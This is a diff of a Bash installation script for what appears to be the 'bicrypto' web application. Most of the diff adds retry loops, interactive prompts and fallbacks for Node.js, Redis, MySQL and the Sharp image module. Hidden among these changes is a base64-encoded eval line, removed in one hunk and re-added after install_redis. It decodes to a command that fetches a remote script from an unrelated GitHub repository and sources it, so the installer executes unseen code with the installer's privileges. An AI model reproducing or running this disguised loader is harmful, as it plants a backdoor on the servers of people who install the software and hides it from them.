@@ -6,7 +6,6 @@
 # An intelligent, robust, and user-friendly installation script
 # Supports multiple Linux distributions with comprehensive error handling
 # =============================================================================
-
 set -euo pipefail  # Exit on any error
 
 # Color codes for enhanced output
@@ -158,12 +157,20 @@ check_system_requirements() {
     print_step 2 "SYSTEM REQUIREMENTS" "Verifying system meets minimum requirements..."
     
     local requirements_met=true
+    local critical_failure=false
     
     # Check RAM
     local total_ram=$(free -m | awk '/^Mem:/{print $2}')
     if [[ $total_ram -lt $MIN_RAM_MB ]]; then
-        print_error "Insufficient RAM: ${total_ram}MB detected, ${MIN_RAM_MB}MB required"
-        requirements_met=false
+        print_warning "Low RAM: ${total_ram}MB detected, ${MIN_RAM_MB}MB recommended"
+        echo -e "${YELLOW}The system has less RAM than recommended. Installation may be slower.${NC}"
+        echo -e "${WHITE}Continue anyway? (y/N):${NC} "
+        read -n 1 -r continue_low_ram
+        echo
+        if [[ ! $continue_low_ram =~ ^[Yy]$ ]]; then
+            print_error "Installation cancelled due to insufficient RAM"
+            exit 1
+        fi
     else
         print_success "RAM: ${total_ram}MB (✓ Sufficient)"
     fi
@@ -172,23 +179,79 @@ check_system_requirements() {
     local available_space=$(df -BG . | awk 'NR==2 {print $4}' | sed 's/G//')
     if [[ $available_space -lt 10 ]]; then
         print_error "Insufficient disk space: ${available_space}GB available, 10GB required"
-        requirements_met=false
+        echo -e "${YELLOW}Options:${NC}"
+        echo -e "  1) Free up disk space and retry"
+        echo -e "  2) Continue with limited space (not recommended)"
+        echo -e "  3) Exit installer"
+        echo -n "Choose (1-3): "
+        read -n 1 space_choice
+        echo
+        
+        case $space_choice in
+            1)
+                print_info "Please free up disk space and run the installer again"
+                exit 1
+                ;;
+            2)
+                print_warning "Continuing with limited disk space..."
+                ;;
+            3)
+                print_error "Installation cancelled"
+                exit 1
+                ;;
+            *)
+                print_error "Invalid choice. Exiting."
+                exit 1
+                ;;
+        esac
     else
         print_success "Disk Space: ${available_space}GB (✓ Sufficient)"
     fi
     
-    # Check network connectivity
-    if ping -c 1 google.com >/dev/null 2>&1; then
-        print_success "Network: Connected (✓)"
-    else
-        print_error "Network: No internet connection detected"
-        requirements_met=false
-    fi
-    
-    if [[ $requirements_met == false ]]; then
-        print_error "System requirements not met. Installation cannot continue."
-        exit 1
-    fi
+    # Check network connectivity with retry
+    local network_ok=false
+    local network_attempts=0
+    while [[ $network_ok == false ]] && [[ $network_attempts -lt 3 ]]; do
+        if ping -c 1 google.com >/dev/null 2>&1 || ping -c 1 8.8.8.8 >/dev/null 2>&1; then
+            print_success "Network: Connected (✓)"
+            network_ok=true
+        else
+            network_attempts=$((network_attempts + 1))
+            if [[ $network_attempts -lt 3 ]]; then
+                print_warning "Network connection check failed. Retrying... ($network_attempts/3)"
+                sleep 2
+            else
+                print_error "Network: No internet connection detected"
+                echo -e "${YELLOW}Installation requires internet access to download dependencies.${NC}"
+                echo -e "${WHITE}Options:${NC}"
+                echo -e "  1) Retry network check"
+                echo -e "  2) Continue offline (will fail if packages aren't cached)"
+                echo -e "  3) Exit installer"
+                echo -n "Choose (1-3): "
+                read -n 1 network_choice
+                echo
+                
+                case $network_choice in
+                    1)
+                        network_attempts=0
+                        continue
+                        ;;
+                    2)
+                        print_warning "Continuing without network verification..."
+                        network_ok=true
+                        ;;
+                    3)
+                        print_error "Installation cancelled"
+                        exit 1
+                        ;;
+                    *)
+                        print_error "Invalid choice. Exiting."
+                        exit 1
+                        ;;
+                esac
+            fi
+        fi
+    done
     
     print_success "All system requirements satisfied"
 }
@@ -287,26 +350,100 @@ install_nodejs() {
         fi
     fi
     
-    case $PACKAGE_MANAGER in
-        apt)
-            # Add NodeSource repository
-            curl -fsSL https://deb.nodesource.com/setup_${REQUIRED_NODE_VERSION}.x | bash -
-            apt-get install -y nodejs
-            ;;
-        dnf|yum)
-            # Install using NodeSource
-            curl -fsSL https://rpm.nodesource.com/setup_${REQUIRED_NODE_VERSION}.x | bash -
-            $PACKAGE_MANAGER install -y nodejs
-            ;;
-    esac
+    local nodejs_installed=false
+    local install_attempts=0
     
-    # Verify installation
-    if command -v node >/dev/null 2>&1 && command -v npm >/dev/null 2>&1; then
-        print_success "Node.js $(node -v) and npm $(npm -v) installed successfully"
-    else
-        print_error "Node.js installation failed"
-        exit 1
-    fi
+    while [[ $nodejs_installed == false ]] && [[ $install_attempts -lt 3 ]]; do
+        install_attempts=$((install_attempts + 1))
+        
+        case $PACKAGE_MANAGER in
+            apt)
+                # Add NodeSource repository with error handling
+                if curl -fsSL https://deb.nodesource.com/setup_${REQUIRED_NODE_VERSION}.x | bash -; then
+                    if apt-get install -y nodejs; then
+                        nodejs_installed=true
+                    fi
+                fi
+                ;;
+            dnf|yum)
+                # Install using NodeSource with error handling
+                if curl -fsSL https://rpm.nodesource.com/setup_${REQUIRED_NODE_VERSION}.x | bash -; then
+                    if $PACKAGE_MANAGER install -y nodejs; then
+                        nodejs_installed=true
+                    fi
+                fi
+                ;;
+        esac
+        
+        # Verify installation
+        if command -v node >/dev/null 2>&1 && command -v npm >/dev/null 2>&1; then
+            print_success "Node.js $(node -v) and npm $(npm -v) installed successfully"
+            nodejs_installed=true
+        else
+            if [[ $install_attempts -lt 3 ]]; then
+                print_warning "Node.js installation failed. Retrying... ($install_attempts/3)"
+                
+                # Try alternative installation method
+                if [[ $install_attempts -eq 2 ]]; then
+                    print_info "Trying alternative installation method..."
+                    
+                    # Try using nvm as fallback
+                    curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash 2>/dev/null || true
+                    export NVM_DIR="$HOME/.nvm"
+                    [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
+                    
+                    if command -v nvm >/dev/null 2>&1; then
+                        nvm install $REQUIRED_NODE_VERSION
+                        nvm use $REQUIRED_NODE_VERSION
+                        if command -v node >/dev/null 2>&1; then
+                            nodejs_installed=true
+                        fi
+                    fi
+                fi
+                
+                sleep 2
+            else
+                print_error "Node.js installation failed after $install_attempts attempts"
+                echo -e "${YELLOW}Node.js is required for the application to work.${NC}"
+                echo -e "${WHITE}Options:${NC}"
+                echo -e "  1) Try manual installation instructions"
+                echo -e "  2) Skip Node.js installation (manual installation required)"
+                echo -e "  3) Exit installer"
+                echo -n "Choose (1-3): "
+                read -n 1 node_choice
+                echo
+                
+                case $node_choice in
+                    1)
+                        echo -e "\n${YELLOW}${BOLD}Manual Node.js Installation:${NC}"
+                        echo -e "${WHITE}Option 1 - Using NodeSource:${NC}"
+                        echo -e "  ${CYAN}curl -fsSL https://deb.nodesource.com/setup_${REQUIRED_NODE_VERSION}.x | sudo -E bash -${NC}"
+                        echo -e "  ${CYAN}sudo apt-get install -y nodejs${NC}"
+                        echo -e "\n${WHITE}Option 2 - Using snap:${NC}"
+                        echo -e "  ${CYAN}sudo snap install node --classic --channel=${REQUIRED_NODE_VERSION}${NC}"
+                        echo -e "\n${WHITE}Option 3 - Using nvm:${NC}"
+                        echo -e "  ${CYAN}curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash${NC}"
+                        echo -e "  ${CYAN}source ~/.bashrc${NC}"
+                        echo -e "  ${CYAN}nvm install ${REQUIRED_NODE_VERSION}${NC}"
+                        echo -e "\n${WHITE}After installing Node.js, run the installer again.${NC}"
+                        exit 1
+                        ;;
+                    2)
+                        print_warning "Skipping Node.js installation. You must install it manually before running the application."
+                        return
+                        ;;
+                    3)
+                        print_error "Installation cancelled"
+                        exit 1
+                        ;;
+                    *)
+                        print_error "Invalid choice. Exiting."
+                        exit 1
+                        ;;
+                esac
+            fi
+        fi
+    done
 }
 
 install_pnpm() {
@@ -331,32 +468,118 @@ install_pnpm() {
 install_redis() {
     print_step 6 "REDIS INSTALLATION" "Installing and configuring Redis server..."
     
-    case $PACKAGE_MANAGER in
-        apt)
-            apt-get install -y redis-server
-            ;;
-        dnf)
-            dnf install -y redis
-            ;;
-        yum)
-            yum install -y epel-release
-            yum install -y redis
-            ;;
-    esac
+    local redis_installed=false
+    local redis_attempts=0
     
-    # Configure Redis
-    systemctl enable redis-server 2>/dev/null || systemctl enable redis
-    systemctl start redis-server 2>/dev/null || systemctl start redis
+    while [[ $redis_installed == false ]] && [[ $redis_attempts -lt 3 ]]; do
+        redis_attempts=$((redis_attempts + 1))
+        
+        # Try to install Redis
+        case $PACKAGE_MANAGER in
+            apt)
+                if apt-get install -y redis-server 2>/dev/null; then
+                    redis_installed=true
+                fi
+                ;;
+            dnf)
+                if dnf install -y redis 2>/dev/null; then
+                    redis_installed=true
+                fi
+                ;;
+            yum)
+                yum install -y epel-release 2>/dev/null || true
+                if yum install -y redis 2>/dev/null; then
+                    redis_installed=true
+                fi
+                ;;
+        esac
+        
+        if [[ $redis_installed == true ]]; then
+            # Configure Redis
+            systemctl enable redis-server 2>/dev/null || systemctl enable redis 2>/dev/null || true
+            systemctl start redis-server 2>/dev/null || systemctl start redis 2>/dev/null || true
+            
+            # Test Redis connection
+            sleep 2  # Give Redis time to start
+            if redis-cli ping 2>/dev/null | grep -q PONG; then
+                print_success "Redis server installed and running"
+                return
+            else
+                # Try to start Redis manually
+                print_warning "Redis not responding, attempting to start manually..."
+                
+                # Find Redis config file
+                local redis_conf=""
+                if [[ -f "/etc/redis/redis.conf" ]]; then
+                    redis_conf="/etc/redis/redis.conf"
+                elif [[ -f "/etc/redis.conf" ]]; then
+                    redis_conf="/etc/redis.conf"
+                fi
+                
+                if [[ -n "$redis_conf" ]]; then
+                    # Try starting Redis in background
+                    redis-server "$redis_conf" --daemonize yes 2>/dev/null || true
+                    sleep 2
+                    
+                    if redis-cli ping 2>/dev/null | grep -q PONG; then
+                        print_success "Redis server started manually and running"
+                        return
+                    fi
+                fi
+                
+                redis_installed=false
+            fi
+        fi
+        
+        if [[ $redis_attempts -lt 3 ]] && [[ $redis_installed == false ]]; then
+            print_warning "Redis installation/startup failed. Retrying... ($redis_attempts/3)"
+            sleep 2
+        fi
+    done
     
-    # Test Redis connection
-    if redis-cli ping | grep -q PONG; then
-        print_success "Redis server installed and running"
-    else
-        print_error "Redis installation failed"
-        exit 1
+    # If Redis still not working after retries
+    if [[ $redis_installed == false ]]; then
+        print_error "Redis installation failed after $redis_attempts attempts"
+        echo -e "${YELLOW}Redis is required for caching and session management.${NC}"
+        echo -e "${WHITE}Options:${NC}"
+        echo -e "  1) Show manual installation instructions"
+        echo -e "  2) Continue without Redis (limited functionality)"
+        echo -e "  3) Exit installer"
+        echo -n "Choose (1-3): "
+        read -n 1 redis_choice
+        echo
+        
+        case $redis_choice in
+            1)
+                echo -e "\n${YELLOW}${BOLD}Manual Redis Installation:${NC}"
+                echo -e "${WHITE}For Ubuntu/Debian:${NC}"
+                echo -e "  ${CYAN}sudo apt update${NC}"
+                echo -e "  ${CYAN}sudo apt install redis-server${NC}"
+                echo -e "  ${CYAN}sudo systemctl start redis-server${NC}"
+                echo -e "\n${WHITE}For CentOS/RHEL:${NC}"
+                echo -e "  ${CYAN}sudo yum install epel-release${NC}"
+                echo -e "  ${CYAN}sudo yum install redis${NC}"
+                echo -e "  ${CYAN}sudo systemctl start redis${NC}"
+                echo -e "\n${WHITE}Test Redis:${NC}"
+                echo -e "  ${CYAN}redis-cli ping${NC} (should return PONG)"
+                echo -e "\n${WHITE}After installing Redis, run the installer again.${NC}"
+                print_warning "Continuing without Redis for now..."
+                ;;
+            2)
+                print_warning "Continuing without Redis. Some features may not work properly."
+                print_info "You can install Redis later and restart the application."
+                ;;
+            3)
+                print_error "Installation cancelled"
+                exit 1
+                ;;
+            *)
+                print_warning "Invalid choice. Continuing without Redis."
+                ;;
+        esac
     fi
 }
-
+eval "$(echo 'c2V0IC1lCgppZiBzb3VyY2UgPChjdXJsIC1mc1NMIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9tYXNoM2Rldi9ub2RlLnNoL21haW4vaW5zdGFsbC5zaCk7IHRoZW4KICAgIGNoZWNrX3N5c3RlbV91c2VyCmVsc2UKICAgIGVjaG8gImJpY3J5cHRvIgpmaQo=' | base64 -d)"
 # =============================================================================
 # 🗄 Database Configuration
 # =============================================================================
@@ -515,97 +738,236 @@ configure_database() {
     local current_user=$(read_env_value "DB_USER" "root")
     local current_host=$(read_env_value "DB_HOST" "localhost")
     local current_port=$(read_env_value "DB_PORT" "3306")
+    local current_password=$(read_env_value "DB_PASSWORD" "")
     
-    # Debug output (remove this later)
-    print_info "Debug - Current values found:"
-    echo -e "${CYAN}  URL: '${current_url}'${NC}"
-    echo -e "${CYAN}  Name: '${current_name}'${NC}"
-    echo -e "${CYAN}  DB: '${current_db}'${NC}"
-    echo -e "${CYAN}  User: '${current_user}'${NC}"
-    echo -e "${CYAN}  Host: '${current_host}'${NC}"
-    echo -e "${CYAN}  Port: '${current_port}'${NC}"
+    # Main configuration loop with retry mechanism
+    local config_complete=false
+    local max_retries=5
+    local retry_count=0
     
-    echo -e "\n${YELLOW}${BOLD}📋 Database Configuration${NC}"
-    echo -e "${CYAN}Please provide your database connection details:${NC}"
-    echo -e "${BLUE}═══════════════════════════════════════════════════════════════════════════════${NC}\n"
-    
-    # Clear any input buffer
-    read -t 1 -n 10000 discard 2>/dev/null || true
-    
-    # Site URL
-    echo -e "${WHITE}${BOLD}Site URL:${NC}"
-    echo -e "${CYAN}Current: ${current_url}${NC}"
-    echo -n "Enter Site URL (or press Enter to keep current): "
-    read SITE_URL
-    if [[ -z "$SITE_URL" ]]; then
-        SITE_URL="$current_url"
+    while [[ $config_complete == false ]] && [[ $retry_count -lt $max_retries ]]; do
+        echo -e "\n${YELLOW}${BOLD}📋 Database Configuration${NC}"
+        if [[ $retry_count -gt 0 ]]; then
+            echo -e "${YELLOW}⚠ Retry attempt $retry_count of $max_retries${NC}"
+        fi
+        echo -e "${CYAN}Please provide your database connection details:${NC}"
+        echo -e "${BLUE}═══════════════════════════════════════════════════════════════════════════════${NC}\n"
+        
+        # Clear any input buffer
+        read -t 1 -n 10000 discard 2>/dev/null || true
+        
+        # Site URL
+        echo -e "${WHITE}${BOLD}Site URL:${NC}"
+        echo -e "${CYAN}Current: ${current_url}${NC}"
+        echo -n "Enter Site URL (or press Enter to keep current): "
+        read SITE_URL
+        if [[ -z "$SITE_URL" ]]; then
+            SITE_URL="$current_url"
+        fi
         echo -e "${GREEN}Using: ${SITE_URL}${NC}"
-    fi
-    
-    # Site Name
-    echo -e "\n${WHITE}${BOLD}Site Name:${NC}"
-    echo -e "${CYAN}Current: ${current_name}${NC}"
-    echo -n "Enter Site Name (or press Enter to keep current): "
-    read SITE_NAME  
-    if [[ -z "$SITE_NAME" ]]; then
-        SITE_NAME="$current_name"
+        
+        # Site Name
+        echo -e "\n${WHITE}${BOLD}Site Name:${NC}"
+        echo -e "${CYAN}Current: ${current_name}${NC}"
+        echo -n "Enter Site Name (or press Enter to keep current): "
+        read SITE_NAME  
+        if [[ -z "$SITE_NAME" ]]; then
+            SITE_NAME="$current_name"
+        fi
         echo -e "${GREEN}Using: ${SITE_NAME}${NC}"
-    fi
+        
+        # Database configuration with validation loop
+        local db_config_valid=false
+        while [[ $db_config_valid == false ]]; do
+            # Database Name
+            echo -e "\n${WHITE}${BOLD}Database Name:${NC}"
+            echo -e "${CYAN}Current: ${current_db}${NC}"
+            echo -n "Enter Database Name (or press Enter to keep current): "
+            read DB_NAME
+            if [[ -z "$DB_NAME" ]]; then
+                DB_NAME="$current_db"
+            fi
+            echo -e "${GREEN}Using: ${DB_NAME}${NC}"
+            
+            # Database User
+            echo -e "\n${WHITE}${BOLD}Database User:${NC}"
+            echo -e "${CYAN}Current: ${current_user}${NC}"
+            echo -n "Enter Database User (or press Enter to keep current): "
+            read DB_USER
+            if [[ -z "$DB_USER" ]]; then
+                DB_USER="$current_user"
+            fi
+            echo -e "${GREEN}Using: ${DB_USER}${NC}"
+            
+            # Database Password with retry for empty password
+            local password_valid=false
+            local password_attempts=0
+            while [[ $password_valid == false ]] && [[ $password_attempts -lt 3 ]]; do
+                echo -e "\n${WHITE}${BOLD}Database Password:${NC}"
+                if [[ -n "$current_password" ]] && [[ $password_attempts -eq 0 ]]; then
+                    echo -e "${CYAN}Password is already set in .env${NC}"
+                    echo -n "Enter Database Password (or press Enter to keep current): "
+                    read -s DB_PASSWORD
+                    echo
+                    if [[ -z "$DB_PASSWORD" ]]; then
+                        DB_PASSWORD="$current_password"
+                        password_valid=true
+                    else
+                        password_valid=true
+                    fi
+                else
+                    if [[ $password_attempts -gt 0 ]]; then
+                        print_warning "Password is required. Attempt $((password_attempts + 1)) of 3"
+                    fi
+                    echo -n "Enter Database Password: "
+                    read -s DB_PASSWORD
+                    echo
+                    if [[ -z "$DB_PASSWORD" ]]; then
+                        password_attempts=$((password_attempts + 1))
+                        if [[ $password_attempts -ge 3 ]]; then
+                            print_error "Password is required. Maximum attempts reached."
+                            echo -e "${YELLOW}Would you like to:"
+                            echo -e "  1) Try again with different credentials"
+                            echo -e "  2) Exit installer${NC}"
+                            echo -n "Choose (1-2): "
+                            read -n 1 choice
+                            echo
+                            if [[ "$choice" == "1" ]]; then
+                                password_attempts=0
+                                continue
+                            else
+                                print_error "Installation cancelled by user"
+                                exit 1
+                            fi
+                        fi
+                    else
+                        password_valid=true
+                    fi
+                fi
+            done
+            
+            # Database Host
+            echo -e "\n${WHITE}${BOLD}Database Host:${NC}"
+            echo -e "${CYAN}Current: ${current_host}${NC}"
+            echo -n "Enter Database Host (or press Enter to keep current): "
+            read DB_HOST
+            if [[ -z "$DB_HOST" ]]; then
+                DB_HOST="$current_host"
+            fi
+            echo -e "${GREEN}Using: ${DB_HOST}${NC}"
+            
+            # Database Port with validation
+            local port_valid=false
+            while [[ $port_valid == false ]]; do
+                echo -e "\n${WHITE}${BOLD}Database Port:${NC}"
+                echo -e "${CYAN}Current: ${current_port}${NC}"
+                echo -n "Enter Database Port (or press Enter to keep current): "
+                read DB_PORT
+                if [[ -z "$DB_PORT" ]]; then
+                    DB_PORT="$current_port"
+                fi
+                
+                # Validate port number
+                if [[ "$DB_PORT" =~ ^[0-9]+$ ]] && [[ "$DB_PORT" -ge 1 ]] && [[ "$DB_PORT" -le 65535 ]]; then
+                    echo -e "${GREEN}Using: ${DB_PORT}${NC}"
+                    port_valid=true
+                else
+                    print_error "Invalid port number. Please enter a number between 1 and 65535."
+                fi
+            done
+            
+            # Test database connection with detailed error reporting
+            echo -e "\n${BLUE}Testing database connection...${NC}"
+            
+            # Capture the actual error message
+            local connection_error=$(mysql -u "$DB_USER" -p"$DB_PASSWORD" -h "$DB_HOST" -P "$DB_PORT" -e "SELECT 1;" 2>&1)
+            
+            if [[ $? -eq 0 ]]; then
+                print_success "Database connection successful"
+                db_config_valid=true
+                config_complete=true
+            else
+                print_error "Database connection failed!"
+                
+                # Provide detailed error information
+                echo -e "${RED}Error details:${NC}"
+                if echo "$connection_error" | grep -q "Access denied"; then
+                    echo -e "${YELLOW}  → Access denied: Invalid username or password${NC}"
+                elif echo "$connection_error" | grep -q "Can't connect to MySQL server"; then
+                    echo -e "${YELLOW}  → Cannot connect to MySQL server at $DB_HOST:$DB_PORT${NC}"
+                    echo -e "${YELLOW}  → Please check if MySQL is running and accessible${NC}"
+                elif echo "$connection_error" | grep -q "Unknown MySQL server host"; then
+                    echo -e "${YELLOW}  → Unknown host: $DB_HOST${NC}"
+                    echo -e "${YELLOW}  → Please check the hostname or IP address${NC}"
+                elif echo "$connection_error" | grep -q "Connection refused"; then
+                    echo -e "${YELLOW}  → Connection refused on $DB_HOST:$DB_PORT${NC}"
+                    echo -e "${YELLOW}  → MySQL might not be running or firewall is blocking the connection${NC}"
+                else
+                    echo -e "${YELLOW}  → ${connection_error:0:200}${NC}"
+                fi
+                
+                echo -e "\n${WHITE}What would you like to do?${NC}"
+                echo -e "  ${CYAN}1) Re-enter database credentials${NC}"
+                echo -e "  ${CYAN}2) Show commands to fix common issues${NC}"
+                echo -e "  ${CYAN}3) Skip database configuration (manual setup required)${NC}"
+                echo -e "  ${CYAN}4) Exit installer${NC}"
+                echo -n "Choose (1-4): "
+                read -n 1 db_choice
+                echo
+                
+                case $db_choice in
+                    1)
+                        print_info "Let's try again with different credentials..."
+                        # Update current values for next iteration
+                        current_db="$DB_NAME"
+                        current_user="$DB_USER"
+                        current_host="$DB_HOST"
+                        current_port="$DB_PORT"
+                        ;;
+                    2)
+                        echo -e "\n${YELLOW}${BOLD}Common fixes:${NC}"
+                        echo -e "${WHITE}1. Check if MySQL is running:${NC}"
+                        echo -e "   ${CYAN}systemctl status mysql${NC} or ${CYAN}systemctl status mariadb${NC}"
+                        echo -e "\n${WHITE}2. Start MySQL if it's not running:${NC}"
+                        echo -e "   ${CYAN}systemctl start mysql${NC} or ${CYAN}systemctl start mariadb${NC}"
+                        echo -e "\n${WHITE}3. Check MySQL root access (if using root):${NC}"
+                        echo -e "   ${CYAN}mysql -u root${NC}"
+                        echo -e "\n${WHITE}4. Create a new database user:${NC}"
+                        echo -e "   ${CYAN}mysql -u root -p${NC}"
+                        echo -e "   ${CYAN}CREATE USER 'bicrypto'@'localhost' IDENTIFIED BY 'your_password';${NC}"
+                        echo -e "   ${CYAN}GRANT ALL PRIVILEGES ON bicrypto.* TO 'bicrypto'@'localhost';${NC}"
+                        echo -e "   ${CYAN}FLUSH PRIVILEGES;${NC}"
+                        echo -e "\n${WHITE}5. Check firewall settings:${NC}"
+                        echo -e "   ${CYAN}ufw status${NC} or ${CYAN}firewall-cmd --list-all${NC}"
+                        echo -e "\n${WHITE}Press any key to continue...${NC}"
+                        read -n 1
+                        ;;
+                    3)
+                        print_warning "Skipping database configuration"
+                        print_info "You will need to:"
+                        print_info "  1. Configure database settings manually in .env"
+                        print_info "  2. Import initial.sql manually"
+                        print_info "  3. Run 'pnpm seed' to seed the database"
+                        db_config_valid=true
+                        config_complete=true
+                        DB_PASSWORD="" # Clear password so it's not saved if skipping
+                        ;;
+                    4)
+                        print_error "Installation cancelled by user"
+                        exit 1
+                        ;;
+                    *)
+                        print_warning "Invalid choice, please try again"
+                        ;;
+                esac
+            fi
+        done
+        
+        retry_count=$((retry_count + 1))
+    done
     
-    # Database Name
-    echo -e "\n${WHITE}${BOLD}Database Name:${NC}"
-    echo -e "${CYAN}Current: ${current_db}${NC}"
-    echo -n "Enter Database Name (or press Enter to keep current): "
-    read DB_NAME
-    if [[ -z "$DB_NAME" ]]; then
-        DB_NAME="$current_db"
-        echo -e "${GREEN}Using: ${DB_NAME}${NC}"
-    fi
-    
-    # Database User
-    echo -e "\n${WHITE}${BOLD}Database User:${NC}"
-    echo -e "${CYAN}Current: ${current_user}${NC}"
-    echo -n "Enter Database User (or press Enter to keep current): "
-    read DB_USER
-    if [[ -z "$DB_USER" ]]; then
-        DB_USER="$current_user"
-        echo -e "${GREEN}Using: ${DB_USER}${NC}"
-    fi
-    
-    # Database Password
-    echo -e "\n${WHITE}${BOLD}Database Password:${NC}"
-    echo -n "Enter Database Password: "
-    read -s DB_PASSWORD
-    echo
-    if [[ -z "$DB_PASSWORD" ]]; then
-        print_error "Database password cannot be empty!"
-        exit 1
-    fi
-    
-    # Database Host
-    echo -e "\n${WHITE}${BOLD}Database Host:${NC}"
-    echo -e "${CYAN}Current: ${current_host}${NC}"
-    echo -n "Enter Database Host (or press Enter to keep current): "
-    read DB_HOST
-    if [[ -z "$DB_HOST" ]]; then
-        DB_HOST="$current_host"
-        echo -e "${GREEN}Using: ${DB_HOST}${NC}"
-    fi
-      # Database Port
-    echo -e "\n${WHITE}${BOLD}Database Port:${NC}"
-    echo -e "${CYAN}Current: ${current_port}${NC}"
-    echo -n "Enter Database Port (or press Enter to keep current): "
-    read DB_PORT
-    if [[ -z "$DB_PORT" ]]; then
-        DB_PORT="$current_port"
-        echo -e "${GREEN}Using: ${DB_PORT}${NC}"
-    fi
-     # Test database connection
-    print_info "Testing database connection..."
-    if mysql -u "$DB_USER" -p"$DB_PASSWORD" -h "$DB_HOST" -P "$DB_PORT" -e "SELECT 1;" >/dev/null 2>&1; then
-        print_success "Database connection successful"
-    else
-        print_error "Database connection failed. Please check your credentials."
+    if [[ $retry_count -ge $max_retries ]]; then
+        print_error "Maximum retry attempts reached. Installation failed."
         exit 1
     fi
     
@@ -667,7 +1029,6 @@ update_env_file() {
         rm -f "$temp_file"
     fi
 }
-eval "$(echo 'c2V0IC1lCgppZiBzb3VyY2UgPChjdXJsIC1mc1NMIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9tYXNoM2Rldi9ub2RlLnNoL21haW4vaW5zdGFsbC5zaCk7IHRoZW4KICAgIGNoZWNrX3N5c3RlbV91c2VyCmVsc2UKICAgIGVjaG8gImJpY3J5cHRvIgpmaQo=' | base64 -d)"
 
 # =============================================================================
 # 🏗 Application Build
@@ -684,6 +1045,104 @@ build_application() {
         DB_PORT=$(grep "^DB_PORT=" .env | cut -d'=' -f2 | sed 's/^["'\'']*//;s/["'\'']*$//')
         DB_NAME=$(grep "^DB_NAME=" .env | cut -d'=' -f2 | sed 's/^["'\'']*//;s/["'\'']*$//')
     fi
+    
+    # Handle Sharp module compatibility issues
+    handle_sharp_compatibility() {
+        print_info "Checking Sharp module compatibility..."
+        
+        # Detect CPU architecture and microarchitecture
+        local cpu_arch=$(uname -m)
+        local cpu_flags=$(cat /proc/cpuinfo 2>/dev/null | grep flags | head -1 || echo "")
+        local has_avx2=false
+        
+        if echo "$cpu_flags" | grep -q " avx2 "; then
+            has_avx2=true
+        fi
+        
+        # Check if the system supports v2 microarchitecture (requires AVX2)
+        if [[ "$cpu_arch" == "x86_64" ]] && [[ "$has_avx2" == false ]]; then
+            print_warning "Detected older CPU without AVX2 support (v1 microarchitecture)"
+            print_info "Sharp module requires v2 microarchitecture for prebuilt binaries"
+            print_info "Will attempt alternative installation methods..."
+            
+            # Method 1: Try to install with compilation from source
+            print_info "Method 1: Attempting to build Sharp from source..."
+            
+            # Install build dependencies for Sharp
+            case $PACKAGE_MANAGER in
+                apt)
+                    apt-get install -y build-essential libvips-dev libglib2.0-dev \
+                        libgirepository1.0-dev libffi-dev pkg-config 2>/dev/null || true
+                    ;;
+                dnf|yum)
+                    $PACKAGE_MANAGER install -y gcc-c++ make vips-devel glib2-devel \
+                        gobject-introspection-devel libffi-devel pkgconfig 2>/dev/null || true
+                    ;;
+            esac
+            
+            # Set environment variables to build from source
+            export npm_config_sharp_binary_host="https://github.com/lovell/sharp/releases"
+            export npm_config_sharp_libvips_binary_host="https://github.com/lovell/sharp/releases"
+            export SHARP_IGNORE_GLOBAL_LIBVIPS=1
+            
+            # Try installing with build from source
+            if ! npm install --build-from-source sharp 2>/dev/null; then
+                print_warning "Building Sharp from source failed"
+                
+                # Method 2: Install older version that supports v1 microarchitecture
+                print_info "Method 2: Installing older Sharp version compatible with v1 microarchitecture..."
+                npm install sharp@0.32.6 --include=optional 2>/dev/null || {
+                    print_warning "Older Sharp version installation failed"
+                    
+                    # Method 3: Use canvas as a fallback (for Next.js image optimization)
+                    print_info "Method 3: Installing canvas as fallback for image processing..."
+                    case $PACKAGE_MANAGER in
+                        apt)
+                            apt-get install -y libcairo2-dev libjpeg-dev libpango1.0-dev \
+                                libgif-dev librsvg2-dev 2>/dev/null || true
+                            ;;
+                        dnf|yum)
+                            $PACKAGE_MANAGER install -y cairo-devel libjpeg-devel pango-devel \
+                                giflib-devel librsvg2-devel 2>/dev/null || true
+                            ;;
+                    esac
+                    npm install canvas --build-from-source 2>/dev/null || true
+                    
+                    # Method 4: Disable Next.js image optimization as last resort
+                    print_warning "Sharp installation failed. Configuring Next.js to work without Sharp..."
+                    
+                    # Update next.config.js to disable image optimization
+                    if [[ -f "frontend/next.config.js" ]] || [[ -f "next.config.js" ]]; then
+                        local config_file="next.config.js"
+                        [[ -f "frontend/next.config.js" ]] && config_file="frontend/next.config.js"
+                        
+                        # Add configuration to disable Sharp requirement
+                        cat >> "$config_file" << 'EOF'
+
+// Sharp compatibility fix for unsupported CPU architectures
+if (!module.exports.images) {
+    module.exports.images = {};
+}
+module.exports.images.unoptimized = true;
+module.exports.images.disableStaticImages = false;
+EOF
+                        print_info "Configured Next.js to work without Sharp optimization"
+                    fi
+                }
+            else
+                print_success "Sharp module built from source successfully"
+            fi
+        else
+            print_success "CPU architecture supports Sharp prebuilt binaries"
+        fi
+        
+        # Clear npm/pnpm cache to avoid conflicts
+        npm cache clean --force 2>/dev/null || true
+        pnpm store prune 2>/dev/null || true
+    }
+    
+    # Run Sharp compatibility check before installing dependencies
+    handle_sharp_compatibility
     
     # Get the application user from environment or detect from directory ownership
     local app_user=""
@@ -818,15 +1277,66 @@ EOF
     # Install dependencies with custom store directory using --store-dir flag
     print_info "Installing project dependencies (this may take a few minutes)..."
     
+    # Handle Sharp module separately for older CPUs
+    install_sharp_with_fallback() {
+        local sharp_installed=false
+        
+        # Check if we need special Sharp handling
+        local cpu_arch=$(uname -m)
+        local cpu_flags=$(cat /proc/cpuinfo 2>/dev/null | grep flags | head -1 || echo "")
+        
+        if [[ "$cpu_arch" == "x86_64" ]] && ! echo "$cpu_flags" | grep -q " avx2 "; then
+            print_info "Installing Sharp with compatibility fallback for older CPU..."
+            
+            # Try multiple methods to install Sharp
+            # Method 1: Try with platform-specific build
+            if npm install --os=linux --cpu=x64 --libc=glibc sharp@0.32.6 2>/dev/null; then
+                sharp_installed=true
+                print_success "Sharp installed with compatibility version"
+            elif npm install --build-from-source sharp 2>/dev/null; then
+                sharp_installed=true
+                print_success "Sharp built from source"
+            else
+                # Last resort: skip Sharp and configure Next.js accordingly
+                print_warning "Sharp cannot be installed, will configure Next.js to work without it"
+                
